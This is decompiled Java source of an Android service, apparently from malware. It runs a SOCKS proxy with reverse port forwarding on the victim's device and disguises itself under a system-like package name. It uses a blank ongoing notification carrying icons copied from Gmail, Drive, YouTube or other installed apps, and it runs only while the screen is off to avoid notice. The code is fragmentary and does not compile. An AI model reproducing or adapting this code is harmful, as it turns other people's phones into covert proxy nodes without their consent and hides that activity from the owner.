package android.system.sa;
import com.my.es.target.nativeads.banners.NavigationType;
/* loaded from: classes2.dex */
public class SS extends Service {
    public int onStartCommand(Intent intent, int i, int i2) {
            this.e = new JSONObject(intent.getExtras().getString("socks"));
            YM.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
            Logger9.a("startSocksAsyncTask");
            YM.a(this.a, "exit", e2.toString());
            stopSelf();
            System.exit(0);
            this.c = ((PowerManager) getSystemService("power")).newWakeLock(1, "lock");
            this.c.acquire();
            this.d = ((WifiManager) getSystemService("wifi")).createWifiLock(1, "lock");
            this.d.acquire();
            System.exit(0);
                this.d.release();
            this.c.release();
            Logger9.a(e.toString());
        new Thread(new Runnable() { // from class: android.system.sa.SS.1
            @Override // java.lang.Runnable
            public void run() throws InterruptedException {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                        jLongValue = (Long.valueOf(SS.this.e.getString(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT)).longValue() * 1000) + jCurrentTimeMillis;
                        jLongValue = 0;
                        if (Build.VERSION.SDK_INT < 20) {
                            if (SS.this.b.isScreenOn()) {
                                SS.this.a("powerManager");
                        } else if (SS.this.b.isInteractive()) {
                            SS.this.a("powerManager");
                        if (jLongValue == jCurrentTimeMillis || System.currentTimeMillis() <= jLongValue) {
                            if (!SS.this.d()) {
                                SS.this.a("no internet");
                                Thread.currentThread();
                                Thread.sleep(100L);
                            } catch (InterruptedException e2) {
                            SS.this.a(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT);
                } catch (Exception e3) {
                    Logger9.a("catch works");
                    SS.this.a("Exception");
        }).start();
    /* JADX INFO: Access modifiers changed from: private */
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        Logger9.a("closing socks from " + str);
        PortForwardingR.a();
            this.a.stopForeground(true);
        this.a.stopSelf();
        System.exit(0);
        new a().execute(new Integer[0]);
    class a extends AsyncTask<Integer, Void, Void> {
        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* renamed from: a, reason: merged with bridge method [inline-methods] */
        public Void doInBackground(Integer... numArr) {
                YM.a(SS.this.a, "starting", null);
                Logger9.a("PortForwardingR.start");
                Logger9.a("SOCKS.start");
                SOCKS.a(SS.this.a, SS.this.e);
                YM.a(SS.this.a, "exit", e.toString());
                SS.this.a.stopSelf();
                System.exit(0);
        Intent intent = new Intent(this, (Class<?>) Activity.class);
        intent.setAction("socks");
        PendingIntent activity = PendingIntent.getActivity(this, 0, intent, 0);
            Bitmap bitmapB = b(this.e.getString("icon"));
                Logger9.a("icon != null");
                if (Build.VERSION.SDK_INT >= 16) {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();
                Logger9.a("icon = null");
                if (Build.VERSION.SDK_INT >= 16) {
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).build();
                    notification = new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).getNotification();
            startForeground(101, notification);
            Logger9.a(e.toString());
            YM.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
    private Bitmap b(String str) {
        if (str.equalsIgnoreCase("drive") || str.equalsIgnoreCase("gmail") || str.equalsIgnoreCase("music") || str.equalsIgnoreCase("services") || str.equalsIgnoreCase(NavigationType.STORE) || str.equalsIgnoreCase("youtube")) {
            return Utils2.a(this, "icons/" + str + ".png");
            return Utils2.a(getPackageManager().getApplicationIcon(str));
            return null;
    @Override // android.app.Service
    public void onDestroy() {
        a("onDestroy");
        super.onDestroy();
    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }
}